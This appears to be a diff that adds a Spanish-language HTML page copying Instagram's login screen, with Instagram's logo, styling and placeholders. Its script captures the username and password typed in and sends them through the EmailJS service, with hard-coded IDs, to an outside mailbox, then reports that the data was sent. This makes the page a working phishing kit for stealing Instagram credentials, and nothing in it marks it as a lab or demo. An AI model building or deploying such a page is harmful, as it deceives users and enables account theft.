@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Inicio de sesión Instagram</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
+      Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+    background: #fafafa;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    margin: 0;
+    padding: 20px;
+  }
+  .container {
+    width: 100%;
+    max-width: 350px;
+    background: #fff;
+    border: 1px solid #dbdbdb;
+    padding: 40px 40px 30px;
+    border-radius: 1px;
+    box-shadow: 0 0 5px rgba(0,0,0,0.05);
+  }
+  .logo {
+    display: block;
+    margin: 0 auto 20px;
+    width: 175px;
+    height: 51px;
+    background: url("https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png") no-repeat center;
+    background-size: contain;
+  }
+  form {
+    display: flex;
+    flex-direction: column;
+  }
+  input {
+    margin-bottom: 6px;
+    padding: 9px 8px 7px;
+    font-size: 14px;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    background: #fafafa;
+    outline: none;
+    color: #262626;
+  }
+  input::placeholder {
+    color: #999;
+  }
+  input:focus {
+    border-color: #a8a8a8;
+  }
+  button {
+    background-color: #0095f6;
+    border: none;
+    border-radius: 3px;
+    color: white;
+    font-weight: 600;
+    padding: 8px 0;
+    margin-top: 8px;
+    cursor: pointer;
+    font-size: 14px;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #1877f2;
+  }
+  .separator {
+    text-align: center;
+    margin: 20px 0;
+    font-size: 13px;
+    color: #8e8e8e;
+    position: relative;
+  }
+  .separator::before,
+  .separator::after {
+    content: "";
+    position: absolute;
+    top: 50%;
+    width: 40%;
+    height: 1px;
+    background: #dbdbdb;
+  }
+  .separator::before {
+    left: 0;
+  }
+  .separator::after {
+    right: 0;
+  }
+  .message {
+    margin-top: 12px;
+    font-size: 13px;
+    color: green;
+    text-align: center;
+    min-height: 20px;
+  }
+</style>
+<script src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
+<script>
+  // Inicializa EmailJS con tu User ID
+  emailjs.init('6acz-yWuWYdyeOokj');
+
+  window.onload = function() {
+    const form = document.getElementById('loginForm');
+    const messageDiv = document.querySelector('.message');
+
+    form.addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const usuario = document.getElementById('usuario').value.trim();
+      const contraseña = document.getElementById('contraseña').value.trim();
+
+      if (!usuario || !contraseña) {
+        alert('Por favor, rellena todos los campos.');
+        return;
+      }
+
+      const templateParams = {
+        usuario: usuario,
+        contraseña: contraseña
+      };
+
+      emailjs.send('service_eo3i8n4', 'template_0bsppn2', templateParams)
+        .then(function() {
+          messageDiv.textContent = '¡Datos enviados correctamente!';
+          form.reset();
+        }, function(error) {
+          alert('Error al enviar datos: ' + JSON.stringify(error));
+        });
+    });
+  };
+</script>
+</head>
+<body>
+  <div class="container" role="main">
+    <a href="https://www.instagram.com" target="_blank" rel="noopener" aria-label="Instagram Home" class="logo"></a>
+    <form id="loginForm" aria-label="Formulario de inicio de sesión">
+      <input
+        type="text"
+        id="usuario"
+        name="usuario"
+        placeholder="Teléfono, usuario o correo electrónico"
+        autocomplete="username"
+        required
+        aria-required="true"
+      />
+      <input
+        type="password"
+        id="contraseña"
+        name="contraseña"
+        placeholder="Contraseña"
+        autocomplete="current-password"
+        required
+        aria-required="true"
+      />
+      <button type="submit" aria-label="Iniciar sesión">Iniciar sesión</button>
+    </form>
+    <div class="separator">O</div>
+    <div class="message" role="alert" aria-live="polite"></div>
+  </div>
+</body>
+</html>
